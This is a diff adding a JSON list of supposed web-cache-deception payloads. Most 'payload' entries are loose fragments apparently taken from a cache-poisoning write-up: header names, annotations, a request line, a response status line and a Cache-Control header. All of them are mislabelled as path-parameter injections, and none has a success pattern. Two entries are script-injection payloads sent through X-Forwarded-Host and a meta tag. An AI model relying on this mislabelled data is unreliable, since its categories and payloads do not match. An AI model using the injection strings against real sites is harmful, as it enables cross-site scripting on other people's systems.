@@ -1,0 +1,156 @@
+[
+  {
+    "payload_id": "OWP-37532",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Values: User-Agent",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37533",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Values: Cookie",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37534",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Header: X-Forwarded-Host",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37535",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Header: X-Host",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37536",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Header: X-Forwarded-Server",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37537",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Header: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37538",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Header: X-Original-URL (Symfony)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37539",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Header: X-Rewrite-URL (Symfony)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37540",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "GET /test?buster=123 HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37541",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Host: target.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37542",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "X-Forwarded-Host: test\"><script>alert(1)</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37543",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "HTTP/1.1 200 OK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37544",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "Cache-Control: public, no-cache",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37545",
+    "vulnerability_category": "Web Cache Deception",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "<meta property=\"og:image\" content=\"https://test\"><script>alert(1)</script>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
